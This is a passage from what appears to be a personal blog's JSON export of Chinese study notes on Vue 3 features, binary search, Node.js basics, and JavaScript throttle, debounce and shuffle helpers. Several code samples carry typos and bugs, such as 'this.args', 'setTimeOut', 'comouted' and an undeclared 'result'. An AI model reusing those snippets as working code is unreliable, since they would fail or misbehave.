x2=person.firstName console.log(&#x27;watchEffect的回调被调用了&#x27;,x1,x2) &#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"二分查找","slug":"二分查找","date":"2022-01-30T07:37:59.000Z","updated":"2022-01-30T07:53:02.198Z","comments":true,"path":"2022/01/30/二分查找/","link":"","permalink":"https://coloey.github.io/2022/01/30/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","excerpt":"","text":"大家写二分法经常写乱，主要是因为对区间的定义没有想清楚，区间的定义就是不变量。要在二分查找的过程中，保持不变量，就是在while寻找中每一次边界的处理都要坚持根据区间的定义来操作，这就是循环不变量规则。 写二分法，区间的定义一般为两种，左闭右闭即[left, right]，或者左闭右开即[left, right)。 下面我用这两种区间的定义分别讲解两种不同的二分写法。 二分法第一种写法第一种写法，我们定义 target 是在一个在左闭右闭的区间里，也就是[left, right] （这个很重要非常重要）。 区间的定义这就决定了二分法的代码应该如何写，因为定义target在[left, right]区间，所以有如下两点： while (left &lt;= right) 要使用 &lt;= ，因为left == right是有意义的，所以使用 &lt;= if (nums[middle] &gt; target) right 要赋值为 middle - 1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是 middle - 1 1234567891011121314151617181920// 版本一class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0; int right = nums.size() - 1; // 定义target在左闭右闭的区间里，[left, right] while (left &lt;= right) &#123; // 当left==right，区间[left, right]依然有效，所以用 &lt;= int middle = left + ((right - left) / 2);// 防止溢出 等同于(left + right)/2 if (nums[middle] &gt; target) &#123; right = middle - 1; // target 在左区间，所以[left, middle - 1] &#125; else if (nums[middle] &lt; target) &#123; left = middle + 1; // target 在右区间，所以[middle + 1, right] &#125; else &#123; // nums[middle] == target return middle; // 数组中找到目标值，直接返回下标 &#125; &#125; // 未找到目标值 return -1; &#125;&#125;; 二分法第二种写法如果说定义 target 是在一个在左闭右开的区间里，也就是[left, right) ，那么二分法的边界处理方式则截然不同。 有如下两点： while (left &lt; right)，这里使用 &lt; ,因为left == right在区间[left, right)是没有意义的 if (nums[middle] &gt; target) right 更新为 middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle] 1234567891011121314151617181920// 版本二class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0; int right = nums.size(); // 定义target在左闭右开的区间里，即：[left, right) while (left &lt; right) &#123; // 因为left == right的时候，在[left, right)是无效的空间，所以使用 &lt; int middle = left + ((right - left) &gt;&gt; 1); if (nums[middle] &gt; target) &#123; right = middle; // target 在左区间，在[left, middle)中 &#125; else if (nums[middle] &lt; target) &#123; left = middle + 1; // target 在右区间，在[middle + 1, right)中 &#125; else &#123; // nums[middle] == target return middle; // 数组中找到目标值，直接返回下标 &#125; &#125; // 未找到目标值 return -1; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"插槽","slug":"插槽","date":"2022-01-29T15:41:20.000Z","updated":"2022-01-29T15:58:25.041Z","comments":true,"path":"2022/01/29/插槽/","link":"","permalink":"https://coloey.github.io/2022/01/29/%E6%8F%92%E6%A7%BD/","excerpt":"","text":"1 作用： 让父组件可以向子组件指定位置插入html结构，是一种组件间的通信方式，适用于父组件=&gt;子组件 2 使用方式 （1）默认插槽 123456789101112父组件： &lt;Category&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/Category&gt;子组件： &lt;template&gt; &lt;div&gt; &lt;slot&gt;插槽默认内容&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; 2 具名插槽 1234567891011121314151617181920212223242526父组件： &lt;Category&gt; &lt;template #header&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;template slot=&quot;center&quot;&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;template v-slot:footer&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;/Category&gt;子组件： &lt;template&gt; &lt;div&gt; &lt;slot name=&quot;center&quot;&gt;插槽默认内容&lt;/slot&gt; &lt;slot name=&quot;footer&quot;&gt;插槽默认内容&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; 3 作用域插槽 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者决定，(games数据在Category组件中，但使用数据所遍历的结构由App组件决定) 12345678910111213141516171819202122232425262728293031323334353637383940414243父组件：&lt;Category title=&quot;游戏&quot;&gt; &lt;template v-slot=&quot;&#123;games&#125;&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt; &#123;&#123;game&#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;/template&gt;&lt;/Category&gt;&lt;Category title=&quot;游戏&quot;&gt; &lt;template v-slot=&quot;&#123;games&#125;&quot;&gt; &lt;ol&gt; &lt;li v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt; &#123;&#123;game&#125;&#125; &lt;/li&gt; &lt;/ol&gt; &lt;/template&gt;&lt;/Category&gt;子组件：&lt;template&gt;&lt;div&gt; &lt;h3&gt;&#123;&#123;title&#125;&#125;分类&lt;/h3&gt; &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;&lt;/div&gt; &lt;/template&gt;&lt;script&gt;import &#123;reactive&#125; from &quot;vue&quot;export default &#123; name:&#x27;Category&#x27;, props:[&#x27;title&#x27;], setup()&#123; let games=reactive([&#x27;红色警戒&#x27;,&#x27;超级玛丽&#x27;,&#x27;穿越火线&#x27;,&#x27;魂斗罗&#x27;]) return&#123; games &#125; &#125;&#125;&lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"ref函数","slug":"ref函数","date":"2022-01-27T07:38:53.000Z","updated":"2022-02-01T09:52:15.436Z","comments":true,"path":"2022/01/27/ref函数/","link":"","permalink":"https://coloey.github.io/2022/01/27/ref%E5%87%BD%E6%95%B0/","excerpt":"","text":"ref函数：作用：定义一个响应式函数 语法：const xxx=ref(initValue) 创建一个包含响应式数据的引用对象（reference对象，简称ref对象) JS中操作数据：xxx.value 模板中读取数据，不需要.value,直接 Ps: 接收的数据类型可以是：基本类型也可以是对象类型 基本类型的数据：响应式依然是靠Object.defineProperty()的get与set完成 对象基本类型的数据：内部是求助了Vue3中的一个新函数——reactive函数 ref与reactive对比：定义数据角度：ref用来定义：基本类型数据 reactive用来定义：对象（或数组类型数据） PS：ref也可以用来定义对象（或数组）类型数据，它内部会自动通过reactive转为代理对象 从原理角度对比：ref通过Object.defineProperty()的getter和setter来实现响应式（数据劫持） reactive通过使用Proxy来实现响应式，并通过Reflect操作源对象内部的数据 使用角度对比：ref定义的数据，操作数据需要通过.value,读取数据时模板直接读取不需要.value reactive定义的数据操作数据与读取数据均不需要.value 响应式数据的判断isRef:检查一个值是否为一个ref对象 isReactive:检查一个对象是否由reactive创建的响应式代理 isReadonly:检查一个对象是否由readonly创建的只读代理 isProxy:检查一个对象是否由reactive或者readonly方法创建的代理","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"props","slug":"props","date":"2022-01-27T04:14:42.000Z","updated":"2022-01-27T05:34:36.203Z","comments":true,"path":"2022/01/27/props/","link":"","permalink":"https://coloey.github.io/2022/01/27/props/","excerpt":"","text":"配置项:props 功能：让组件接收外部传来的数据 （1）传递数据： 第一种方式（只接收）：props:[‘name’] 第二种方式（限制类型）：props:{name:String} 第三种方式（限制类型，限制必要性，指定默认值）： props:{ ​ name:{ ​ type:String,//类型 ​ required:true,//必要性 ​ dedault:’老王’//默认值 ​ } } Ps:props是只读的，vue底层会监视你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后修改data中的数 eg:data(){ return{ myName:this.myName } }","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"生命周期钩子","slug":"生命周期钩子","date":"2022-01-26T02:13:45.000Z","updated":"2022-01-26T02:20:22.472Z","comments":true,"path":"2022/01/26/生命周期钩子/","link":"","permalink":"https://coloey.github.io/2022/01/26/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90/","excerpt":"","text":"beforeCreate,created,beforeMount,mounted,beforeUpdated,updated,beforeUnmount,unmounted 常用生命周期钩子:mounted:发送ajax请求，启动定时器，绑定自定义事件，订阅消息等【初始化操作】 beforeUnmount:清除定时器，解绑自定义事件，取消订阅消息等【收尾工作】 关于销毁实例： 1销毁后借助Vue开发者工具看不到任何信息 2 销毁后自定义事件失效，但原生DOM事件依然有效 3 一般不会在beforeUnmount操作数据，因为即使操作数据，也不会触发更新流程了","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"自定义指令","slug":"自定义指令","date":"2022-01-25T09:14:32.000Z","updated":"2022-01-25T09:39:59.802Z","comments":true,"path":"2022/01/25/自定义指令/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/","excerpt":"","text":"自定义指令1.语法：（1） 局部指令：​ directives:{指令名：配置对象}或 directives：{指令名:回调函数} （2）全局指令：Vue.directive(指令名，配置对象)或Vue.directive(指令名，回调函数) 2.配置对象中常用的回调created：在绑定元素的 attribute 或事件监听器被应用之前调用。在指令需要附加在普通的 v-on 事件监听器调用前的事件监听器中时，这很有用。` beforeMount：当指令第一次绑定到元素并且在挂载父组件之前调用。mounted：指令与元素成功绑定时使用 updated:在包含组件的 VNode 及其子组件的 VNode 更新后调用。 beforeUpdate：在更新包含组件的 VNode 之前调用。 beforeUnmount：在卸载绑定元素的父组件之前调用 unmounted：当指令与元素解除绑定且父组件已卸载时，只调用一次。 PS:指令定义时不加v-,，但是使用时要加v- 指令名如果是多个单词要用kebab-case命名方式，不要用camelCase命名 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;div id=&quot;root&quot;&gt; &lt;h3&gt;&#123;&#123;name&#125;&#125;&lt;/h3&gt; &lt;h3&gt;当前n:&lt;span v-text=&quot;n&quot;&gt;&#123;&#123;n&#125;&#125;&lt;/span&gt;&lt;/h3&gt; &lt;h3&gt;放大10倍后的n：&lt;span v-big=&quot;n&quot;&gt;&#123;&#123;n&#125;&#125;&lt;/span&gt;&lt;/h3&gt; &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt; &lt;br&gt; &lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt; &lt;/div&gt;&lt;script src=&quot;https://unpkg.com/vue@next&quot;&gt;&lt;/script&gt; &lt;script&gt; Vue.createApp(&#123; data()&#123; return&#123; name:&quot;ann&quot;, n:1 &#125; &#125;, directives: &#123; //v-big被调用：指令与元素成功绑定时（一上来） 指令所在模板重新编译时 big(element,binding)&#123; element.innerText=binding.value*10 &#125;, /*fbind(element,binding)&#123; element.value=binding.value element.focus() &#125;,*/ fbind:&#123; // 当被绑定的元素挂载到 DOM 中时…… mounted(element,binding)&#123; console.log(this) element.value=binding.value element.focus() &#125;, updated(element,binding)&#123; element.value=binding.value &#125; &#125; &#125; &#125;).mount(&quot;#root&quot;) &lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"内置指令","slug":"内置指令","date":"2022-01-25T05:58:47.000Z","updated":"2022-01-25T07:45:44.154Z","comments":true,"path":"2022/01/25/内置指令/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/","excerpt":"","text":"v-html:1 作用：向指定节点中渲染包含html的内容 2 与插值语法的区别： （1）v-html会替换掉节点中所有内容，则不会 （2）v-html可以识别html结构 3 严重注意：v-html有安全性问题 （1）在网站上动态渲染任意HTML非常危险，容易导致XSS攻击 （2）一定要在可信内容上使用v-html，永远不要用在用户提交的内容上 v-cloak(没有值)1 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性 2 使用css配合一个v-clock可以解决网速慢时页面展示出的问题 123456789101112131415161718&lt;style&gt; [v-cloak]&#123; display:none &#125;&lt;/style&gt; &lt;h2 v-cloak&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt; &lt;div&gt; &lt;script&gt;&lt;/script&gt;//延迟5秒的服务器 &lt;/div&gt; &lt;script&gt; Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27; &#125; &#125; &#125;) &lt;/script&gt; v-once: v-once 节点在初次动态渲染后，就被视为静态内容 以后数据改变不会引起v-once所在结构的更新，可以用于优化性能 v-pre:1.跳过其所在节点的编译过程 2.可利用它跳过没有使用指令语法，插值语法的节点，加快编译","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"收集表单数据","slug":"收集表单数据","date":"2022-01-25T03:09:55.000Z","updated":"2022-01-25T06:30:01.780Z","comments":true,"path":"2022/01/25/收集表单数据/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/","excerpt":"","text":"收集表单数据： ,v-model收集的死是value值，用户输入的是value值 ,v-model收集的是value值，且给标签配置value值 (1）没有配置input的value属性，收集的是checked(true/false) (2)配置input的value属性： 若v-model的初始值是非数组，收集的是checked(true/false) 若v-model的初始值是数组，收集的是value组成的数组 PS： v-model有三个修饰符： lazy:失去焦点再收集数据 number:把输入的字符串转为有效数字 trim: 输入首尾空格过滤","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Node.js基础","slug":"Node-js基础","date":"2022-01-24T13:57:44.000Z","updated":"2022-04-12T14:03:59.192Z","comments":true,"path":"2022/01/24/Node-js基础/","link":"","permalink":"https://coloey.github.io/2022/01/24/Node-js%E5%9F%BA%E7%A1%80/","excerpt":"","text":"Node.js运行时结构： 1 异步IO 当Node.js执行I/O操作时，会在响应返回后恢复操作，而不是阻止线程并占用额外内存等待 2 单线程 实际JS线程+uv线程池+V8任务线程池+V8inspector线程 优点：不用考虑多线程同步问题，也就不需要锁，同时还能比较高效的利用系统资源 缺点：阻塞会产生负面影响，解决方法：多进程或多线程 3 跨平台 Node.js跨平台+JS无需编译环境（Web跨平台，诊断工具跨平台）","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"Vue监视数据原理","slug":"Vue监视数据原理","date":"2022-01-24T10:24:05.000Z","updated":"2022-01-25T01:45:04.281Z","comments":true,"path":"2022/01/24/Vue监视数据原理/","link":"","permalink":"https://coloey.github.io/2022/01/24/Vue%E7%9B%91%E8%A7%86%E6%95%B0%E6%8D%AE%E5%8E%9F%E7%90%86/","excerpt":"","text":"Vue监视数据原理1 Vue会监视data中所有层次的数据（递归） 2 如何监视对象中的数据？ 通过setter实现监视，且要在new Vue的时候就传入要监测的数据。 （1）对象中后追加的属性，Vue默认不做响应式处理 （2）如需给后续添加的属性左响应式，请使用下面的API: ​ Vue.set(target,propertyName/index,value):target不允许是Vue实例或者vm中的data对象 vm.$set(target,propertyName/index,value) 3 如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质做了两件事： （1） 调用原生对应的方法对数组进行更新 （2） 重新解析模板，进而更新页面 4 在Vue中修改数组中的某个元素一定要用如下方法： （1）使用这些API：push(),shift(),unshift(),splice(),sort(),reverse() （2）Vue.set()或vm.$set() 非变更方法，例如 filter()、concat() 和 slice()。它们不会变更原始数组，而总是返回一个新数组。当使用非变更方法时，可以用新数组替换旧数组：","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"key作用与原理","slug":"key作用与原理","date":"2022-01-24T05:48:50.000Z","updated":"2022-03-21T06:52:14.947Z","comments":true,"path":"2022/01/24/key作用与原理/","link":"","permalink":"https://coloey.github.io/2022/01/24/key%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/","excerpt":"","text":"key的内部原理1 虚拟DOM中key的作用： key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】和【旧虚拟DOM】的对比，对比规则如下： 2 对比规则： （1）旧虚拟DOM中找到与新虚拟DOM相同的key： 若虚拟DOM中内容不变，则直接使用之前的真实DOM 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换页面中的真实 DOM （2）旧虚拟DOM中未找到与新虚拟DOM相同的key，创建新的真实DOM，随后渲染到页面 3 用index作为key可能会引发的问题： （1）若对数据进行逆序添加，逆序删除等操作： 会产生没有必要的真实DOM更新==&gt;界面效果没问题，但是效率低 （2）如果结构中还包含输入类DOM： 会产生错误的DOM更新==&gt;界面有问题 4 开发中如何选择key? (1)最好使用每条数据的唯一标识作为key,比如id,身份证号，手机号等唯一值 (2)如果不存在对数据的逆序添加，逆序删除等破坏顺序的操作，仅用于渲染列表用于展示，使用index作为key是没有问题的","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"条件渲染","slug":"条件渲染","date":"2022-01-24T05:22:02.000Z","updated":"2022-01-24T05:48:38.577Z","comments":true,"path":"2022/01/24/条件渲染/","link":"","permalink":"https://coloey.github.io/2022/01/24/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/","excerpt":"","text":"条件渲染1 v-if: 写法： (1). v-if=”表达式” (2) v-else-if=”表达式” (3) v-else 适用于：切换频率较低的情景 特点：不展示的DOM元素直接被移除 注意：v-if和v-else-if,v-else一起使用时要求结构不能被打断 2 v-show 写法： v-show=”表达式” 适用于：切换频率较高的场景 特点：不展示的DOM元素未被移除，使用display=none隐藏掉 PS： 1 使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到 2 v-if可以和template配合使用","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"绑定class样式","slug":"绑定class样式","date":"2022-01-24T03:39:15.000Z","updated":"2022-01-24T05:18:30.948Z","comments":true,"path":"2022/01/24/绑定class样式/","link":"","permalink":"https://coloey.github.io/2022/01/24/%E7%BB%91%E5%AE%9Aclass%E6%A0%B7%E5%BC%8F/","excerpt":"","text":"绑定class样式12345678910111213141516171819202122232425262728293031323334 &lt;div id=&quot;demo&quot;&gt; &lt;!-- 绑定class样式--字符串写法，适用于样式类名不确定。需要动态确定 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定，名字也不确定 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;/div&gt;&lt;script src=&quot;https://unpkg.com/vue@next&quot;&gt;&lt;/script&gt; &lt;script&gt; Vue.config.productionTip = false Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27;, mood:&#x27;normal&#x27;, classArr:[&#x27;c1&#x27;,&#x27;c2&#x27;,&#x27;c3&#x27;], classObj:&#123; &#x27;c1&#x27;:false, &#x27;c2&#x27;:false, &#125; &#125; &#125;, methods:&#123; changeMood()&#123; const arr=[&#x27;happy&#x27;,&#x27;sad&#x27;,&#x27;normal&#x27;] this.mood=arr[Math.floor(Math.random()*3)] &#125; &#125; &#125;).mount(&#x27;#demo&#x27;) &lt;/script&gt; 绑定style样式1 :style=”{fontSize: xxx}”,其中xxx是动态值","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"watch和computed区别","slug":"watch和computed区别","date":"2022-01-24T02:41:52.000Z","updated":"2022-01-24T02:55:41.453Z","comments":true,"path":"2022/01/24/watch和computed区别/","link":"","permalink":"https://coloey.github.io/2022/01/24/watch%E5%92%8Ccomputed%E5%8C%BA%E5%88%AB/","excerpt":"","text":"computed和watch的区别:1 computed能完成的功能watch也能完成 2 watch能完成的功能computed不一定能完成，例如watch能完成异步操作 PS： 1 所有被Vue管理的函数要写成普通函数，这样new Vue的实例的时候this才能绑定到新创建的vm或组件实例对象 2 所有不被Vue管理的函数比如（定时器的回调函数，ajax的回调函数和Promise的回调函数）最好写成箭头函数，箭头函数的this绑定会继承外层函数的this绑定 12345678910111213141516171819202122Vue.createApp(&#123; data()&#123; return &#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&quot;张三&quot; &#125; &#125; watch:&#123; firstName(val)&#123; setTimeout(()=&gt;&#123; this.fullName=val+this.lastName&#125;,1000) &#125;, lastName(val)&#123; setTimeout(()=&gt;&#123; this.fullName=thia.firstName+val&#125;,1000) &#125; &#125;&#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"computed","slug":"computed","date":"2022-01-23T14:45:11.000Z","updated":"2022-01-30T14:46:44.584Z","comments":true,"path":"2022/01/23/computed/","link":"","permalink":"https://coloey.github.io/2022/01/23/computed/","excerpt":"","text":"计算属性1 定义： 要用的属性不存在，要通过已有的属性计算得来 2 原理： 底层借助了Object.defineproperty()方法提供的getter和setter。 3 get函数什么时候执行 (1) 初次读取时会执行一次 (2)当依赖的数据发生改变时会被再次调用 4 优势：与methods相比。内部有缓存机制，效率更高，调试方便 5 计算属性最终会出现在vm中，直接读取使用即可 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变 简写：函数 Vue3中12345678910111213141516171819setup()&#123; //计算属性简写let fullName=computed(()=&gt;&#123; return person.firstName+&quot;-&quot;+person.lastName&#125;)//计算属性完整let fullName=comouted(&#123; get()&#123; return person.firstName+&quot;-&quot;+person.lastName &#125; set(val)&#123; const nameArr=value.split(&quot;-&quot;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125;&#125;)&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"事件处理","slug":"事件处理","date":"2022-01-23T10:35:27.000Z","updated":"2022-01-23T14:23:07.968Z","comments":true,"path":"2022/01/23/事件处理/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/","excerpt":"","text":"事件的基本使用： 使用v-on:xxx或@xxx绑定事件，其中xxx是事件名 事件的回调需要配置在methods对象中，最终会在vm上 methods中配置的函数，不要用箭头函数，否则this就不是vm methods中配置的函数，都是被Vue管理的函数，this的指向是vm或组件实例对象 @click=”demo”和@click=”demo($event)”效果一致，但后者可以传参 事件修饰符prevent:阻止默认事件 stop：阻止事件冒泡 once:事件只触发一次 键盘事件1 Vue常用按键别名： 回车：enter 删除：delete 退出：esc 空格：space 换行：tab(特殊，必须配合keydown使用) 上：up 下:down 左:left 右:right 2 Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为keb-case(短横线命名) 3 系统修饰符(用法特殊):ctrl,alt,shift,meta (1)配合keyup使用：按下修饰键的同时再按下其他键，随后释放其他键，事件才被触发 (2)配合keydown使用：正常触发事件 4 也可以使用keyCode去指定具体的键 5 Vue.config.keyCode自定义键名=键码，可以定制按键别名","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"数据代理","slug":"数据代理","date":"2022-01-23T09:50:13.000Z","updated":"2022-01-24T10:26:42.258Z","comments":true,"path":"2022/01/23/数据代理/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/","excerpt":"","text":"Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读或写 Vue中数据代理的好处：更加方便操作data中的数据 基本原理 ​ 通过Object.defineProperty()把data对象中的所有属性添加到vm上中，为每一个添加到vm上的属性都指定一个getter()setter()函数，在getter()setter()函数；里面去操作data中对应的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243 const vm=Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27;, address:&#x27;06404&#x27; &#125; &#125; &#125;)vm&#123;..._data&#123; name:(...), address:(...), &#125;name:(...)address:(...)//Object.defineProperty()Object.defineProperty(vm,&#x27;name&#x27;,&#123; value:_data.name.get() enumerable: writable: configurable://默认为false,控制属性是否可以被删除 get()&#123; return _data.name.get() &#125; set(value)&#123; _data.name.set(value) &#125;&#125;)Object.defineProperty(vm,&#x27;address&#x27;,&#123; value:_data.address.get() enumerable: writable: configurable://默认为false,控制属性是否可以被删除 get()&#123; return _data.address.get() &#125; set(value)&#123; _data.address.set(value); &#125;&#125;)&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"MVVM","slug":"MVVM","date":"2022-01-23T08:23:36.000Z","updated":"2022-01-23T09:48:20.724Z","comments":true,"path":"2022/01/23/MVVM/","link":"","permalink":"https://coloey.github.io/2022/01/23/MVVM/","excerpt":"","text":"MVVM M:模型(Model) data中的数据 V：视图(View) 模板代码 VM:视图模型（ViewModel):Vue实例 data中的所有属性最后都出现在vm身上 vm上的所有属性及Vue原型上的所有属性，在Vue模板中都可以直接使用 12345678910&lt;div&gt;View&lt;/div&gt;const vm=Vue.createApp(&#123;//vm:VM data()&#123; return&#123; Model &#125; &#125;&#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"数据绑定","slug":"数据绑定","date":"2022-01-23T07:57:58.000Z","updated":"2022-01-23T08:05:06.352Z","comments":true,"path":"2022/01/23/数据绑定/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/","excerpt":"","text":"数据绑定1. 单向绑定v-bind:数据只能从data流向页面 2.双向绑定v-model:数据不仅能从data流向页面，还能从页面流向data v-model:value的value可以简写为v-model,因为v-model默认收集的就是value值","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"模板语法","slug":"模板语法","date":"2022-01-23T07:36:44.000Z","updated":"2022-01-23T07:52:52.618Z","comments":true,"path":"2022/01/23/模板语法/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95/","excerpt":"","text":"Vue 模板语法1 插值语法功能：用于解析标签体内容 写法：，xxx是js表达式，直接读取js中的所有data属性 2 指令语法功能： 用于解析标签（包括标签属性，标签内容等） 举例：v-bind:href=”xxx”,简写为:href=”xxx”,xxx同样可以写js表达式，且可以直接读取到data里的所有属性 写法：v-xxx","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"高阶函数","slug":"高阶函数","date":"2022-01-17T06:06:06.000Z","updated":"2022-01-17T09:29:33.289Z","comments":true,"path":"2022/01/17/高阶函数/","link":"","permalink":"https://coloey.github.io/2022/01/17/%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/","excerpt":"","text":"高阶函数模板12345function HoF0(fn)&#123; return function(...args)&#123; return fn.apply(this,args); &#125;&#125; Once123456789function once(fn)&#123; return function(..args)&#123; if(fn)&#123; const ret=fn.apply(this,args); fn=null; return ret; &#125; &#125;&#125; Throttle1234567891011121314151617function throttle(fn,time=500)&#123; let timer; return function(...args)&#123; if(timer==null)&#123; fn.apply(this.args); timer=setTimeout(()=&gt;&#123; timer=null; &#125;,time) &#125; &#125;&#125;btn.onclick=throttle(function(e)&#123; circle.innerHTML=parseInt(circle.innerHTML)+1; circle.className=&#x27;fade&#x27;; setTimeout(()=&gt;circle.className=&#x27;&#x27;,250);&#125;); Debouce123456789101112function debouce(fn,dur)&#123; dur=dur||100; var timer; return function()&#123; clearTimeout(timer); timer=setTimeOut(()=&gt;&#123; fn.apply(this,arguments); &#125;,dur); &#125;&#125; iterative12345678910111213function iterative(fn)&#123; return function(subject,...rest)&#123; if(isIterable(subject))&#123; const ret=[]; for(let obj of subject)&#123; ret.push(fn.apply(this,[obj,...rest])); &#125; return ret; &#125; return fn.apply(this,[subject,...rest]); &#125;&#125; 过程抽象 HOF 装饰器 命令式/声明式 洗牌算法：123456789101112131415161718192021function*draw(cards)&#123; const c=[...cards]; for(let i=c.length;i&gt;0;i--)&#123; const pIdx=Math.floor(Math.random()*i); [c[pIdx],c[i-1]]=[c[i-1],c[pIdx]]; yield c[i-1]; &#125;&#125;function generate(amount,count)&#123; if(count&lt;=1)return [amount]; const cards=Array(amount-1).fill(0).map((_,i)=&gt;i+1); const pick=draw(cards); for(let i=0;i&lt;count;i++)&#123; result.push(pick.next().value); &#125; result.sort((a,b)=&gt;a-b); for(let i=count-1;i&gt;0;i--)&#123; result[i]=result[i]-result[i-1]; &#125; return 